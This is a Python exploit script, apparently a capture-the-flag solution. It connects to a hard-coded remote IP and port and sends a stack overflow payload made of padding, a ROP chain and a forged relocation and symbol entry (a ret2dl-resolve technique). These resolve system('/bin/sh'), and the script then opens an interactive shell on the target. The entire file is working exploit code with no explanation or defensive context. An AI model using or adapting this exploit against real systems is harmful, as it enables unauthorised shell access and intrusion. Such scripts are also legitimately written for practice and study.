#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re
import time

#host = "10.211.55.16"
#port = 8888

host = "133.130.111.139"
port = 2333

sock = make_conn(host,port)

jmprel = 0x8048318
symtab = 0x80481d8
strtab = 0x8048268
index = 0x2068

reloc = pack32(0x804a000)
reloc += pack32(0x21b07)

sym = pack32(0x2124)

binsh = 0x804a398

payload = "a"*108
payload += pack32(0x804a520) #ebp
payload += pack32(0x8048390) #ret read
payload += pack32(0x804856c) #pop3 ret
payload += pack32(0)
payload += pack32(0x804a380)
payload += pack32(0x200)
payload += pack32(0x8048370)
payload += pack32(index) 
payload += pack32(0)
payload += pack32(binsh)
recvuntil(sock,"!")
sendline(sock,payload)
time.sleep(0.2)
sendline(sock,reloc + sym + "system\x00\x00" + pack32(0) + "/bin/sh\x00")
inter(sock)
